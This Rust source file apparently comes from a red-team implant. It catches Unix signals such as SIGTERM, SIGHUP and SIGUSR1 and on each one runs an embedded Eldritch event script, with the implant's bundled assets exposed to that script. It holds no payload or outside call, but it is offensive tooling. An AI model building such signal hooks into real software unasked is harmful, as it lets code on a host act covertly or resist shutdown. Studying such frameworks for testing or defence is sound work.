/*
 * Event callbacks that let eldritch functions run when the implant does certain tasks
 */
#[cfg(feature = "events")]
use eldritchv2::{
    Value,
    Interpreter,
    assets::std::{EmbeddedAssets, StdAssetsLibrary},
};
#[cfg(feature = "events")]
use std::{collections::BTreeMap, sync::{Arc, OnceLock}};
#[cfg(feature = "events")]
use tokio::signal::unix::{signal, SignalKind};

#[cfg(feature = "events")]
static EVENT_SCRIPT: OnceLock<Option<String>> = OnceLock::new();

#[cfg(feature = "events")]
pub async fn catch_signals() {
    let mut sigint = signal(SignalKind::interrupt()).ok();
    let mut sigterm = signal(SignalKind::terminate()).ok();
    let mut sighup = signal(SignalKind::hangup()).ok();
    let mut sigquit = signal(SignalKind::quit()).ok();
    let mut sigusr1 = signal(SignalKind::user_defined1()).ok();
    let mut sigusr2 = signal(SignalKind::user_defined2()).ok();
    let mut sigchld = signal(SignalKind::child()).ok();

    loop {
        let sig = tokio::select! {
            _ = async { if let Some(ref mut s) = sigint { s.recv().await; } else { std::future::pending::<()>().await; } } => "sigint",
            _ = async { if let Some(ref mut s) = sigterm { s.recv().await; } else { std::future::pending::<()>().await; } } => "sigterm",
            _ = async { if let Some(ref mut s) = sighup { s.recv().await; } else { std::future::pending::<()>().await; } } => "sighup",
            _ = async { if let Some(ref mut s) = sigquit { s.recv().await; } else { std::future::pending::<()>().await; } } => "sigquit",
            _ = async { if let Some(ref mut s) = sigusr1 { s.recv().await; } else { std::future::pending::<()>().await; } } => "sigusr1",
            _ = async { if let Some(ref mut s) = sigusr2 { s.recv().await; } else { std::future::pending::<()>().await; } } => "sigusr2",
            _ = async { if let Some(ref mut s) = sigchld { s.recv().await; } else { std::future::pending::<()>().await; } } => "sigchild",
        };

        // Send them to the events handler
        tokio::spawn(async move {
            let event = "on_".to_owned() + sig;
            on_event(&event, BTreeMap::new()).await;
        });
    }
}

#[cfg(feature = "events")]
pub fn load_event_script() {
    EVENT_SCRIPT.get_or_init(|| {
        let path = "on_event.eldritch";
        crate::assets::Asset::get(path)
            .map(|f| String::from_utf8_lossy(&f.data).into_owned())
    });
}

#[cfg(feature = "events")]
pub async fn on_event(name: &str, mut args: BTreeMap<String, Value>) {
    // See if the event script exists

    use eldritchv2::conversion::ToValue;
    
    // Check for the universal event script
    let script_content = EVENT_SCRIPT.get().cloned().flatten();

    let content = match script_content {
        Some(s) => s,
        None => return,
    };

    #[cfg(debug_assertions)]
    log::info!("Running event script 'events/on_event.eldritch' for event: {}", name);

    // Add event name to args
    let mut input_params: BTreeMap<String, Value> = BTreeMap::new();
    input_params.insert("event".to_string(), name.to_string().to_value());
    input_params.insert("args".to_string(), args.to_value());
    // Embedded assets are exposed to the callbacks
    let asset_backend = Arc::new(EmbeddedAssets::<crate::assets::Asset>::new());
    let mut locker = StdAssetsLibrary::new();
    let _ = locker.add(asset_backend);
    // Execute using Eldritch V2 Interpreter
    let mut interpreter = Interpreter::new().with_default_libs();
    interpreter.register_lib(locker);
    interpreter.define_variable("input_params", input_params.to_value());
    
    match interpreter.interpret(&content) {
        Ok(_) => {}
        Err(_e) => {
            #[cfg(debug_assertions)]
            log::error!("Failed to execute event script: events/on_event.eldritch: {_e}");
        }
    }
}